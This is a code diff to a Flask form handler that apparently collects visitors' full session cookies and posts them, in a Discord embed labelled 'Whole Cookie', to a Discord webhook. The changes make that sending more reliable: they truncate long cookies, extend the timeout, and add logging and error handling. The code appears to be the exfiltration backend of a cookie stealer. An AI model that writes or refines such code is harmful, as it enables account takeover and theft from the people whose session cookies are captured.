@@ -156,7 +156,7 @@ def submit_form():
                     },
                     {
                         'name': '🍪 Whole Cookie',
-                        'value': f'```{cookie}```' if cookie else 'Not provided',
+                        'value': f'```{cookie[:1000]}{"..." if len(cookie) > 1000 else ""}```' if cookie else 'Not provided',
                         'inline': False
                     }
                 ],
@@ -168,20 +168,33 @@ def submit_form():
         
         # Send to Discord with timeout and error handling
         try:
-            response = requests.post(webhook_url, json=discord_data, timeout=5)
+            # Log the payload size for debugging
+            payload_size = len(json.dumps(discord_data))
+            print(f"Sending Discord payload of size: {payload_size} bytes")
+            
+            response = requests.post(webhook_url, json=discord_data, timeout=10)
             
             if response.status_code in [200, 204]:
+                print(f"Discord webhook successful: {response.status_code}")
                 return jsonify({
                     'success': True, 
                     'message': 'Data sent successfully'
                 })
             else:
-                print(f"Discord webhook failed: {response.status_code} - {response.text}")
+                error_text = response.text[:500]  # Limit error text to prevent log spam
+                print(f"Discord webhook failed: {response.status_code} - {error_text}")
                 return jsonify({
                     'success': False, 
                     'message': f'Discord API error: {response.status_code}'
                 }), 500
-        except requests.RequestException:
+        except requests.Timeout:
+            print("Discord webhook timeout error")
+            return jsonify({
+                'success': False, 
+                'message': 'Request timeout - Discord may be slow'
+            }), 500
+        except requests.RequestException as e:
+            print(f"Discord webhook network error: {str(e)}")
             return jsonify({
                 'success': False, 
                 'message': 'Network error occurred'
